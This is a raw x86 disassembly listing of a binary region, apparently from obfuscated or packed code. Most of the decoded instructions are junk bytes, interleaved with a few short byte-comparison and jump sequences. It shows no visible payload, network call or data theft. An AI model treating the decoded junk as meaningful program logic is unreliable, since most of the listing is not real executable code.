  410b98:	out    0x3f,al
  410b9a:	jo     0x410b32
  410b9c:	lahf   
  410b9d:	mov    cl,0x9f
  410b9f:	cmp    edx,eax
  410ba1:	dec    ebp
  410ba2:	fsub   DWORD PTR [si-0x3a]
  410ba6:	cld    
  410ba7:	clc    
  410ba8:	loopne 0x410b9a
  410baa:	scas   eax,DWORD PTR es:[edi]
  410bab:	xor    eax,0xb0b397a4
  410bb0:	xchg   edx,esi
  410bb2:	in     eax,dx
  410bb3:	(bad)  
  410bb4:	stos   BYTE PTR es:[edi],al
  410bb5:	mov    eax,ds:0x5624c5fa
  410bba:	xor    al,0x87
  410bbc:	jg     0x410b9d
  410bbe:	xchg   ebx,eax
  410bbf:	into   
  410bc0:	cmovbe ebx,DWORD PTR [ebp+0x62701b66]
  410bc7:	dec    eax
  410bc8:	add    edx,esp
  410bca:	fimul  WORD PTR [edx+edx*1]
  410bcd:	mov    dl,0xce
  410bcf:	or     al,0x32
  410bd1:	iret   
  410bd2:	fwait
  410bd3:	push   ebx
  410bd4:	icebp  
  410bd5:	fwait
  410bd6:	lods   al,BYTE PTR ds:[esi]
  410bd7:	mov    al,0x1
  410bd9:	mov    ah,BYTE PTR [edi]
  410bdb:	mov    ds:0xfe832257,eax
  410be0:	sahf   
  410be1:	pop    eax
  410be2:	mov    cl,0xeb
  410be4:	cmp    DWORD PTR [esi],eax
  410be6:	imul   ebx,esp,0x7e
  410be9:	push   ds
  410bea:	std    
  410beb:	push   es
  410bec:	repnz pop ss
  410bee:	xchg   esi,eax
  410bef:	sub    eax,0x88efe972
  410bf4:	cmc    
  410bf5:	loop   0x410c0c
  410bf7:	mov    ebx,DWORD PTR [ecx+0x15]
  410bfa:	sbb    eax,0x55c6838e
  410bff:	cmp    dl,BYTE PTR [eax]
  410c01:	cmp    DWORD PTR [esi+0x511a3ed4],ebp
  410c07:	dec    edi
  410c08:	fwait
  410c09:	mov    ds:0x62781238,eax
  410c0e:	adc    cl,al
  410c10:	adc    eax,0xcf792271
  410c15:	push   edx
  410c16:	add    ch,BYTE PTR [ebp-0x3a69d1ca]
  410c1c:	xor    edi,DWORD PTR [edi]
  410c1e:	rcl    DWORD PTR [ebp-0x3f8edc9d],1
  410c24:	cmp    BYTE PTR [eax],0x63
  410c27:	popa   
  410c28:	sub    al,0x70
  410c2a:	push   edi
  410c2b:	push   ebx
  410c2c:	fidiv  WORD PTR [edi-0x6b]
  410c2f:	sub    eax,0xc191c8ce
  410c34:	mov    edx,DWORD PTR [esi-0x28]
  410c37:	in     al,dx
  410c38:	hlt    
  410c39:	aam    0xe0
  410c3b:	in     eax,dx
  410c3c:	sub    BYTE PTR [ecx],dl
  410c3e:	ret    0xd67a
  410c41:	add    BYTE PTR [eax+0x68d603b1],ah
  410c47:	mov    esi,0x479bfb6f
  410c4c:	test   DWORD PTR [edx+0x5946e088],ebp
  410c52:	jb     0x410c7a
  410c54:	cmp    BYTE PTR [ebx+eax*1-0x4ee6da02],dl
  410c5b:	adc    al,0xde
  410c5d:	ret    
  410c5e:	jno    0x410c42
  410c60:	daa    
  410c61:	into   
  410c62:	addr16 inc eax
  410c64:	inc    ebx
  410c65:	icebp  
  410c66:	add    ah,dl
  410c68:	sub    al,ch
  410c6a:	daa    
  410c6b:	in     eax,dx
  410c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c6d:	push   esp
  410c6e:	in     al,dx
  410c6f:	stos   BYTE PTR es:[edi],al
  410c70:	and    eax,0x1f854e43
  410c75:	add    al,0x24
  410c77:	shl    DWORD PTR [ebx],1
  410c79:	mov    DWORD PTR [ecx*4-0x16a1927],ecx
  410c80:	mov    ds,WORD PTR [ebx+0x3c]
  410c83:	std    
  410c84:	jl     0x410c77
  410c86:	lods   al,BYTE PTR ds:[esi]
  410c87:	dec    edx
  410c88:	pop    esp
  410c89:	ficomp DWORD PTR [ebx-0x6721c370]
  410c8f:	xchg   esi,eax
  410c90:	xchg   edx,eax
  410c91:	sub    BYTE PTR [esi],dh
  410c93:	and    al,0xe1
  410c95:	pop    es
  410c96:	outs   dx,DWORD PTR ds:[esi]
  410c97:	jbe    0x410d0c
  410c99:	cli    
  410c9a:	sub    dl,cl
  410c9c:	or     eax,0x6ab5772a
  410ca1:	sbb    ecx,DWORD PTR [eax-0x5787f5ee]
  410ca7:	cmp    edi,ecx
  410ca9:	aas    
  410caa:	retf   
  410cab:	push   ebp
  410cac:	or     DWORD PTR [edx],esi
  410cae:	cdq    
  410caf:	mov    DWORD PTR [ebx],eax
  410cb1:	leave  
  410cb2:	icebp  
  410cb3:	sbb    eax,DWORD PTR [ebp+0x60f0f65f]
  410cb9:	cdq    
  410cba:	cwde   
  410cbb:	int3   
  410cbc:	push   0x4b
  410cbe:	repz push eax
  410cc0:	add    edi,DWORD PTR [ebx+0x60]
  410cc3:	retf   0x513c
  410cc6:	push   cs
  410cc7:	mov    BYTE PTR [ebp+0x16],0xfc
  410ccb:	jge    0x410cd7
  410ccd:	ds dec ecx
  410ccf:	mov    esp,0xbb1b6d82
  410cd4:	dec    ecx
  410cd5:	push   0xffffffee
  410cd7:	and    al,0x4c
  410cd9:	dec    eax
  410cda:	js     0x410d52
  410cdc:	push   edi
  410cdd:	call   0x3be1:0xb4820187
  410ce4:	fstp   QWORD PTR [ebp+0xf]
  410ce7:	pop    ecx
  410ce8:	call   ecx
  410cea:	cli    
  410ceb:	mov    dh,0xa3
  410ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cee:	dec    esi
  410cef:	mov    bl,0x53
  410cf1:	and    eax,0x9b7f1ce9
  410cf6:	call   0x80c1:0x5fc9914d
  410cfd:	or     ecx,DWORD PTR [ebx+eax*8-0x2f]
  410d01:	clc    
  410d02:	xor    eax,0x2590d6e2
  410d07:	dec    ecx
  410d08:	cmp    BYTE PTR [edi+0x51],0xbc
  410d0c:	mov    DWORD PTR [edx],eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x9e2cba9c
  410d25:	(bad)  
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410caf
  410d2f:	mov    bl,0xc
  410d31:	ss (bad) 
  410d34:	mov    dh,BYTE PTR ds:0x65750164
  410d3a:	push   eax
  410d3b:	add    BYTE PTR [ebp+eiz*4+0x28],al
  410d3f:	jne    0x410d8f
  410d41:	xchg   esp,eax
  410d42:	lahf   
  410d43:	dec    esi
  410d44:	add    cl,BYTE PTR [eax+edx*1+0x15]
  410d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d49:	jbe    0x410cfb
  410d4b:	int3   
  410d4c:	mov    ecx,0x534f28cc
  410d51:	aas    
  410d52:	lea    esp,[eax-0x4daa6863]
  410d58:	xchg   ebx,eax
  410d59:	xchg   ecx,eax
  410d5a:	push   eax
  410d5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d5c:	pop    esp
  410d5d:	leave  
  410d5e:	mov    ebp,0x7114859b
  410d63:	ss and eax,0x8a4363e1
  410d69:	retf   
  410d6a:	xchg   edi,eax
  410d6b:	inc    edx
  410d6c:	(bad)  
  410d6d:	repz imul esi,DWORD PTR ds:0x791afc0e,0xbe3c7dad
  410d78:	fprem1 
  410d7a:	loopne 0x410da9
  410d7c:	mov    edi,gs
  410d7e:	or     al,0x1d
  410d80:	iret   
  410d81:	icebp  
  410d82:	inc    ebp
  410d83:	sub    al,0x34
  410d85:	stos   DWORD PTR es:[edi],eax
  410d86:	sbb    al,0x6c
  410d88:	pop    edx
  410d89:	pop    eax
  410d8a:	(bad)  
  410d8b:	mov    ebp,DWORD PTR [ebp*4-0x4de32fa9]
  410d92:	push   ds
  410d93:	jne    0x410dc9
  410d95:	sub    ah,cl
  410d97:	ins    BYTE PTR es:[edi],dx
  410d98:	popf   
  410d99:	and    al,0x36
  410d9b:	or     al,0x79
  410d9d:	mov    DWORD PTR [edx+ecx*8-0x7f8041d6],ebp
  410da4:	pop    eax
  410da5:	xchg   esp,eax
  410da6:	push   cs
  410da7:	mov    eax,ds:0x664affb7
  410dac:	ret    0x4271
  410daf:	stos   DWORD PTR es:[edi],eax
  410db0:	adc    dh,BYTE PTR [edi]
  410db2:	cmp    eax,0x7174403c
  410db7:	jle    0x410e02
  410db9:	cmp    al,0xac
  410dbb:	bound  ebp,QWORD PTR [edi-0xb]
  410dbe:	add    eax,0xb72eb05c
  410dc3:	add    al,0x55
  410dc5:	imul   edx,DWORD PTR [ebx],0xffffff9e
  410dc8:	ds dec edi
  410dca:	inc    BYTE PTR cs:[edi+ebp*1+0x765c4c9c]
  410dd2:	das    
  410dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd4:	pop    ebx
  410dd5:	push   ebp
  410dd6:	jno    0x410e06
  410dd8:	int    0xce
  410dda:	mov    cl,0xb
  410ddc:	mov    ds,WORD PTR [ecx]
  410dde:	xor    DWORD PTR [edi+0x2b5eabcb],esp
  410de4:	shr    DWORD PTR ds:0x8e20cf12,cl
  410dea:	div    DWORD PTR [ebx-0x78]
  410ded:	arpl   WORD PTR [esi],di
  410def:	arpl   dx,sp
  410df1:	mov    bl,0x5f
  410df3:	mov    ah,0x96
  410df5:	jnp    0x410dec
  410df7:	sbb    al,0x72
  410df9:	fistp  DWORD PTR [edi+0x5c]
  410dfc:	outs   dx,BYTE PTR ds:[esi]
  410dfd:	cmp    BYTE PTR [ecx-0x4c37da78],ah
  410e03:	mov    ebp,ebp
  410e05:	loope  0x410dd7
  410e07:	sbb    ah,BYTE PTR [ebx+0x3f]
  410e0a:	out    dx,eax
  410e0b:	xor    DWORD PTR [ecx-0x49],ebp
  410e0e:	mov    ch,0x25
  410e10:	jp     0x410e75
  410e12:	pop    esi
  410e13:	imul   ebx,ebx,0x72ce9c4a
  410e19:	addr16 daa 
  410e1b:	ins    BYTE PTR es:[edi],dx
  410e1c:	push   eax
  410e1d:	inc    ebx
  410e1e:	xchg   esp,eax
  410e1f:	jne    0x410e8f
  410e21:	xchg   edi,eax
  410e22:	scas   eax,DWORD PTR es:[edi]
  410e23:	test   al,0x3e
  410e25:	ins    BYTE PTR es:[edi],dx
  410e26:	cdq    
  410e27:	mov    ds:0x76064483,eax
  410e2c:	lea    edi,[edi]
  410e2e:	sbb    DWORD PTR [edx+0x77],ebx
  410e31:	sbb    dl,BYTE PTR [edi+0x30b24442]
  410e37:	pop    ebx
  410e38:	push   eax
  410e39:	xchg   edx,eax
  410e3a:	xor    ah,BYTE PTR [edi+0x7ed0e5c2]
  410e40:	pop    es
  410e41:	pop    edx
  410e42:	jge    0x410e42
  410e44:	sbb    edi,DWORD PTR [esi+0x13e62431]
  410e4a:	outs   dx,BYTE PTR ds:[esi]
  410e4b:	sbb    dl,BYTE PTR [esi-0x6c]
  410e4e:	jp     0x410e96
  410e50:	inc    esp
  410e51:	loopne 0x410e6d
  410e53:	sbb    BYTE PTR [eax],0x2f
  410e56:	iret   
  410e57:	rol    DWORD PTR [edx],cl
  410e59:	xor    DWORD PTR [ebx+0x78],edi
  410e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e5d:	(bad)  
  410e5e:	add    DWORD PTR [edx],0xd9be4167
  410e64:	repz loope 0x410e18
  410e67:	in     al,dx
  410e68:	fcom   QWORD PTR [edi+0x7e]
  410e6b:	inc    esi
  410e6c:	mov    cl,bl
  410e6e:	fisttp DWORD PTR ds:[ebp+0x7c6cc2a5]
  410e75:	inc    esp
  410e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e77:	jl     0x410ee1
  410e79:	pop    edx
  410e7a:	sbb    dl,BYTE PTR [edx+0x76]
  410e7d:	push   es
  410e7e:	scas   al,BYTE PTR es:[edi]
  410e7f:	call   0xc324297
  410e84:	xchg   ebx,eax
  410e85:	jg     0x410ea1
  410e87:	xchg   esi,eax
  410e88:	inc    esp
  410e89:	push   cs
  410e8a:	and    bh,BYTE PTR [ebp+0x57]
  410e8d:	idiv   ebp
  410e8f:	adc    DWORD PTR es:[edx],0x63258a33
  410e96:	xchg   ebx,eax
  410e97:	jno    0x410f00
  410e99:	jecxz  0x410eba
  410e9b:	sub    esp,esp
  410e9d:	(bad)  
  410e9e:	jp     0x410e91
  410ea0:	mov    cl,0xbc
  410ea2:	pop    ss
  410ea3:	(bad)  
  410ea5:	out    0x63,eax
  410ea7:	and    eax,0x18bc63b4
  410eac:	sub    dl,0xd3
  410eaf:	pusha  
  410eb0:	iret   
  410eb1:	pusha  
  410eb2:	aam    0x45
  410eb4:	push   esp
  410eb5:	xchg   esi,eax
  410eb6:	inc    eax
  410eb7:	mov    al,ds:0xa791f9a5
  410ebc:	xor    eax,0x95af68e7
  410ec1:	stos   DWORD PTR es:[edi],eax
  410ec2:	mov    al,0xdf
  410ec4:	loopne 0x410f0d
  410ec6:	and    BYTE PTR [edx+0x4b760612],ch
  410ecc:	dec    ebp
  410ecd:	add    edx,esi
  410ecf:	add    bl,bl
  410ed1:	inc    esp
  410ed2:	jno    0x410f09
  410ed4:	add    ebp,edi
  410ed6:	sub    DWORD PTR [esi+ebp*4+0x47],esi
  410eda:	repz pop gs
  410edd:	mov    edi,0xa23c3ed5
  410ee2:	sbb    ecx,DWORD PTR [edi]
  410ee4:	cdq    
  410ee5:	jge    0x410e79
  410ee7:	sahf   
  410ee8:	loopne 0x410ebc
  410eea:	adc    ch,BYTE PTR [ecx-0x46c260b0]
  410ef0:	and    bl,ah
  410ef2:	sub    cl,al
  410ef4:	mov    cl,0x20
  410ef6:	sub    DWORD PTR [edx+ebp*2+0x50a12b6c],ecx
  410efd:	fs scas al,BYTE PTR es:[edi]
  410eff:	pop    esp
  410f00:	jb     0x410ece
  410f02:	mov    ch,0x65
  410f04:	fcomp  DWORD PTR [esi+ebp*1]
  410f07:	fnsetpm(287 only) 
  410f09:	inc    eax
  410f0a:	jg     0x410ec5
  410f0c:	std    
  410f0d:	int    0xf9
  410f0f:	or     eax,0x1218f71f
  410f14:	aas    
  410f15:	mov    cl,0x49
  410f17:	jb     0x410f15
  410f19:	pop    ds
  410f1a:	lock scas al,BYTE PTR es:[edi]
  410f1c:	push   ds
  410f1d:	dec    eax
  410f1e:	fiadd  WORD PTR [ecx+0x53]
  410f21:	add    al,0x1
  410f23:	and    al,0xcf
  410f25:	mov    al,0xd0
  410f27:	fiadd  DWORD PTR [edx-0x4a]
  410f2a:	loope  0x410eb1
  410f2c:	mov    esi,0x2072677b
  410f31:	mov    esp,DWORD PTR [eax-0x1043993a]
  410f37:	pop    ecx
  410f38:	fcom   QWORD PTR [eax+0x6dfcf4a8]
  410f3e:	retf   0xc55a
  410f41:	pop    es
  410f42:	jle    0x410f39
  410f44:	push   ecx
  410f45:	(bad)  
  410f46:	out    0xff,eax
  410f48:	out    0xaa,eax
  410f4a:	aam    0xa7
  410f4c:	xor    eax,0x3e345845
  410f51:	hlt    
  410f52:	ja     0x410f9e
  410f54:	les    eax,FWORD PTR [ebp+0x1f1eb289]
  410f5a:	out    dx,eax
  410f5b:	or     al,0x64
  410f5d:	push   ss
  410f5e:	xchg   edi,eax
  410f5f:	loop   0x410fa4
  410f61:	lock pop esi
  410f63:	adc    ecx,ebp
  410f65:	sub    esi,DWORD PTR [eax-0x5]
  410f68:	sbb    eax,0xf42e20d
  410f6d:	data16 (bad) 
  410f6f:	sub    al,0x54
  410f71:	xchg   DWORD PTR [edi+0x27],ecx
  410f74:	in     eax,0x12
  410f76:	bound  esp,QWORD PTR [esp+eax*2]
  410f79:	in     al,0xd6
  410f7b:	jmp    0x9a37:0xcb176e8
  410f82:	push   esi
  410f83:	leave  
  410f84:	ins    DWORD PTR es:[edi],dx
  410f85:	cmc    
  410f86:	outs   dx,DWORD PTR ds:[esi]
  410f87:	into   
  410f88:	mov    bh,0xbd
  410f8a:	xchg   BYTE PTR [ebx+0x26d8c740],dh
  410f90:	mov    ah,0x53
  410f92:	(bad)  
  410f93:	pop    eax
  410f94:	ret    
  410f95:	pop    ds
  410f96:	push   ecx
  410f97:	add    cl,BYTE PTR [ebx]
  410f99:	sub    esi,ecx
  410f9b:	leave  
  410f9c:	int    0xae
  410f9e:	dec    edx
  410f9f:	popa   
  410fa0:	retf   
  410fa1:	dec    ecx
  410fa2:	and    BYTE PTR [ecx],dl
  410fa4:	dec    ebp
  410fa5:	stc    
  410fa6:	mov    al,ds:0xfd052f9
  410fab:	jno    0x410f3a
  410fad:	inc    ecx
  410fae:	sbb    al,0x27
  410fb0:	cmp    ch,ch
  410fb2:	adc    al,0x8d
  410fb4:	dec    ebx
  410fb5:	jp     0x410f6b
  410fb7:	xor    DWORD PTR [edx+0x27cedb33],ebp
  410fbd:	mov    ch,0x40
  410fbf:	xchg   edi,eax
  410fc0:	jne    0x1dd16719
  410fc6:	addr16 jnp 0x410f94
  410fc9:	out    dx,al
  410fca:	add    BYTE PTR [ebx-0x46e4bce6],0x5b
  410fd1:	jmp    0x410f6f
  410fd3:	cmp    DWORD PTR [edi-0x61822be3],0x23
  410fda:	repz or DWORD PTR [edx-0x3ecc3ca3],edx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410ff0
  41102b:	add    DWORD PTR ds:0x7e471835,ebp
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x41102e
  411037:	daa    
  411038:	cmp    DWORD PTR [ecx+0x5f],ebx
  41103b:	fbld   TBYTE PTR [ebp+edi*4-0x42]
  41103f:	stos   BYTE PTR es:[edi],al
  411040:	inc    ebx
  411041:	xor    BYTE PTR [edx],ah
  411043:	jns    0x4110ae
  411045:	push   0x7e
  411047:	pop    edi
  411048:	in     al,0xf0
  41104a:	pop    esp
  41104b:	add    bl,ch
  41104d:	mov    cl,BYTE PTR [eax*8-0x2abbaf58]
  411054:	mov    ch,0xca
  411056:	loopne 0x411062
  411058:	gs jbe 0x41107d
  41105b:	fisttp QWORD PTR [ecx-0x5f62276d]
  411061:	pusha  
  411062:	icebp  
  411063:	mov    WORD PTR [edx],es
  411065:	sub    BYTE PTR [eax],al
  411067:	sbb    al,0x16
  411069:	dec    ebp
  41106a:	and    DWORD PTR [ebp-0x257a22a1],0x0
  411071:	int3   
  411072:	stc    
  411073:	aaa    
  411074:	stc    
  411075:	das    
  411076:	sbb    DWORD PTR [edx+esi*2],0x7d
  41107a:	(bad)  
  41107b:	imul   edi,ebx,0xffffff99
  41107e:	cmp    DWORD PTR [esi+0x2839ec9],edi
  411084:	call   0x780c:0x6cdb45c8
  41108b:	aad    0xf2
  41108d:	out    0x23,al
  41108f:	inc    esi
  411090:	cmp    al,0x4c
  411092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411093:	lock test BYTE PTR [edi],dh
  411096:	ins    DWORD PTR es:[edi],dx
  411097:	test   BYTE PTR [eax+0x53],bh
  41109a:	repz rol BYTE PTR ss:[ebx+0x45],cl
  41109f:	xlat   BYTE PTR ds:[ebx]
  4110a0:	ret    
  4110a1:	dec    esi
  4110a2:	add    DWORD PTR [ecx-0x7c],ecx
  4110a5:	ror    ebx,0xd7
  4110a8:	dec    ebp
  4110a9:	xlat   BYTE PTR ds:[ebx]
  4110aa:	in     eax,dx
  4110ab:	ins    BYTE PTR es:[edi],dx
  4110ac:	cmp    esp,DWORD PTR [edx-0x38265468]
  4110b2:	push   es
  4110b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b4:	ret    0xb6a6
  4110b7:	inc    ecx
  4110b8:	mov    eax,ds:0x4e237ab4
  4110bd:	ss sbb bh,bl
  4110c0:	xchg   edx,eax
  4110c1:	push   edx
  4110c2:	jp     0x41112f
  4110c4:	(bad)  
  4110c6:	mov    al,ds:0xe9ba94a6
  4110cb:	jmp    0x1d76:0xd7d68d47
  4110d2:	loope  0x411097
  4110d4:	add    eax,0xb55542b0
  4110d9:	push   0x738e7285
  4110de:	mov    BYTE PTR [edi+0x6a],dh
  4110e1:	or     bl,BYTE PTR [edx-0xd74ef90]
  4110e7:	es xor dl,0x41
  4110eb:	push   esp
  4110ec:	hlt    
  4110ed:	xor    cl,ah
  4110ef:	lea    ebp,[ebx+0x132f43d5]
  4110f5:	xchg   ebp,eax
  4110f6:	cmp    BYTE PTR ds:0x2cc3c8e9,0x5e
  4110fd:	xlat   BYTE PTR ds:[ebx]
  4110fe:	shl    DWORD PTR [ecx+0x1e],cl
  411101:	xchg   edi,eax
  411102:	out    dx,al
  411103:	cld    
  411104:	repz lock pop ds
  411107:	cs sub bh,bl
  41110a:	jle    0x41115a
  41110c:	gs nop
  41110e:	cmc    
  41110f:	mov    ah,0x35
  411111:	jp     0x4110c6
  411113:	ins    DWORD PTR es:[edi],dx
  411114:	call   0xcd3c:0xfa8eb9bd
  41111b:	je     0x411176
  41111d:	out    dx,al
  41111e:	jbe    0x411194
  411120:	scas   eax,DWORD PTR es:[edi]
  411121:	jno    0x41118d
  411123:	or     al,0x19
  411125:	mov    bh,0x19
  411127:	daa    
  411128:	div    DWORD PTR [eax+esi*8]
  41112b:	imul   ebp,DWORD PTR [edx+edi*2+0x706431f3],0xae891de9
  411136:	in     eax,dx
  411137:	mov    al,ds:0xc2386371
  41113c:	clc    
  41113d:	bound  esp,QWORD PTR [ebp-0x6d0ed212]
  411143:	ja     0x411136
  411145:	push   ecx
  411146:	daa    
  411147:	jmp    0x41117e
  411149:	sbb    dl,dl
  41114b:	daa    
  41114c:	vpcmpgtb ymm4,ymm4,YMMWORD PTR ss:[edi+eiz*8+0x4]
  411153:	test   eax,0xe1241928
  411158:	dec    esi
  411159:	sub    al,0x1b
  41115b:	xor    DWORD PTR [edx+0x435c7874],ebx
  411161:	push   ebp
  411162:	shl    DWORD PTR [ebp-0x71],0x56
  411166:	fistp  DWORD PTR [esi-0x2f]
  411169:	test   al,0xf2
  41116b:	dec    ebp
  41116c:	mul    BYTE PTR [ecx]
  41116e:	jp     0x411193
  411170:	sub    eax,0x9475b7c4
  411175:	xchg   DWORD PTR ds:0xca2a4889,esp
  41117b:	test   dl,0xae
  41117e:	and    DWORD PTR [ecx],eax
  411180:	inc    eax
  411181:	and    bh,BYTE PTR [edx]
  411183:	pusha  
  411184:	jo     0x4111b4
  411186:	fiadd  DWORD PTR [ebp+0x4d]
  411189:	push   ebx
  41118a:	add    ebx,0x3e
  41118d:	inc    ebx
  41118e:	cmp    esi,DWORD PTR [edx+0x52af4c89]
  411194:	mov    edi,edi
  411196:	outs   dx,DWORD PTR ds:[esi]
  411197:	jl     0x411183
  411199:	mov    dh,0x92
  41119b:	pop    ebx
  41119c:	pop    es
  41119d:	int3   
  41119e:	jecxz  0x4111e6
  4111a0:	or     DWORD PTR [edi-0x29ffadf],ecx
  4111a6:	add    eax,0x85174b1e
  4111ab:	out    0xe2,eax
  4111ad:	test   ecx,ecx
  4111af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111b0:	or     BYTE PTR [edx],0x9d
  4111b3:	stc    
  4111b4:	aaa    
  4111b5:	std    
  4111b6:	sub    bl,ah
  4111b8:	mov    ?,WORD PTR [eax+0x6d]
  4111bb:	stos   BYTE PTR es:[edi],al
  4111bc:	xor    al,0xdf
  4111be:	test   dh,cl
  4111c0:	or     BYTE PTR [ecx+0x12b9f34],cl
  4111c6:	stos   DWORD PTR es:[edi],eax
  4111c7:	ds cmc 
  4111c9:	pop    ds
  4111ca:	pop    ecx
  4111cb:	lds    esp,FWORD PTR [ebp+0x6c46a115]
  4111d1:	xchg   ebx,eax
  4111d2:	jnp    0x41124e
  4111d4:	push   es
  4111d5:	jmp    0x818f65a0
  4111da:	mov    DWORD PTR [ebp+ecx*2+0x5b6771f3],esp
  4111e1:	(bad)  
  4111e2:	pop    ebp
  4111e3:	dec    bx
  4111e5:	jge    0x411223
  4111e7:	dec    eax
  4111e8:	(bad)  
  4111e9:	stos   BYTE PTR es:[edi],al
  4111ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111eb:	or     edi,DWORD PTR [edi]
  4111ed:	mov    ah,0x58
  4111ef:	push   ecx
  4111f0:	cmp    BYTE PTR [edx],al
  4111f2:	mov    ecx,ss
  4111f4:	jmp    0x70a7ba9e
  4111f9:	inc    edi
  4111fa:	mov    gs,WORD PTR [eax]
  4111fc:	jge    0x4111f0
  4111fe:	or     esp,DWORD PTR [edx+edx*4]
  411201:	shl    bh,cl
  411203:	cmp    al,0x8a
  411205:	push   edi
  411206:	pusha  
  411207:	mov    esi,0x2cb148f9
  41120c:	dec    ecx
  41120d:	cmp    al,0xaf
  41120f:	fadd   st(3),st
  411211:	pushf  
  411212:	stc    
  411213:	repnz xor DWORD PTR [edi],ecx
  411216:	bound  edx,QWORD PTR [ebp-0x32d6b15a]
  41121c:	xchg   esi,eax
  41121d:	mov    dh,0xa7
  41121f:	fs pop edi
  411221:	push   ebx
  411222:	jp     0x411201
  411224:	and    ch,bl
  411226:	mov    al,ds:0xe0c40062
  41122b:	imul   eax,DWORD PTR [edi-0x7015eb8d],0x9470aaaa
  411235:	(bad)  
  411236:	shl    BYTE PTR [edx+edx*2-0x4f],1
  41123a:	cld    
  41123b:	ror    bl,cl
  41123d:	imul   BYTE PTR [eax]
  41123f:	or     al,0x50
  411241:	in     eax,0x46
  411243:	jbe    0x41126a
  411245:	mov    ebp,0xaf430722
  41124a:	mov    eax,0x4a5f37df
  41124f:	sub    esp,DWORD PTR [edi+0x67bf3d34]
  411255:	out    dx,eax
  411256:	adc    BYTE PTR [edx+0x3f8d064],bl
  41125c:	dec    edi
  41125d:	cwde   
  41125e:	jl     0x411275
  411260:	popf   
  411261:	call   0x3059:0x9eb70761
  411268:	xchg   ebp,eax
  411269:	aas    
  41126a:	es push ebp
  41126c:	lahf   
  41126d:	repnz or eax,0x2892440d
  411273:	mov    bh,0x41
  411275:	out    dx,al
  411276:	push   ecx
  411277:	jbe    0x41127d
  411279:	mov    ds:0x3f731cd1,al
  41127e:	sub    al,0x3
  411280:	dec    ecx
  411281:	mov    ah,0x5d
  411283:	std    
  411284:	xchg   ebp,eax
  411285:	xchg   BYTE PTR [edi+0x5973a51],bh
  41128b:	in     eax,dx
  41128c:	mov    DWORD PTR [ebp-0x22e52081],ebx
  411292:	outs   dx,DWORD PTR ds:[esi]
  411293:	mov    edi,0xa7b69951
  411298:	popa   
  411299:	or     ebp,DWORD PTR [ecx-0x28]
  41129c:	pop    ds
  41129d:	add    DWORD PTR [edi-0x79],0x56
  4112a1:	inc    edi
  4112a2:	or     esp,ecx
  4112a4:	jg     0x411289
  4112a6:	ss cld 
  4112a8:	mov    cl,0xd9
  4112aa:	mov    edi,0xd6e5fc3e
  4112af:	jle    0x411261
  4112b1:	xchg   BYTE PTR [ecx*4+0x4ab95057],bh
  4112b8:	and    al,bh
  4112ba:	mov    esi,0xca5d318d
  4112bf:	fwait
  4112c0:	xchg   esi,eax
  4112c1:	int    0x77
  4112c3:	ins    BYTE PTR es:[edi],dx
  4112c4:	and    edx,DWORD PTR [eax-0x48]
  4112c7:	ret    0x6068
  4112ca:	pop    esp
  4112cb:	cmc    
  4112cc:	xchg   edi,eax
  4112cd:	out    0x38,eax
  4112cf:	add    eax,0x96a7fc4f
  4112d4:	mov    ah,0xdd
  4112d6:	xchg   esi,eax
  4112d7:	in     al,0x3e
  4112d9:	xchg   esp,eax
  4112da:	and    BYTE PTR [esi-0x2b],dl
  4112dd:	sti    
  4112de:	mov    BYTE PTR [eax+ecx*2],ch
  4112e1:	lock or al,0x3d
  4112e4:	sbb    BYTE PTR [eax+0x53],bl
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x5568f61e,eax
  411318:	dec    ecx
  411319:	sub    ch,BYTE PTR [edx+0x49]
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
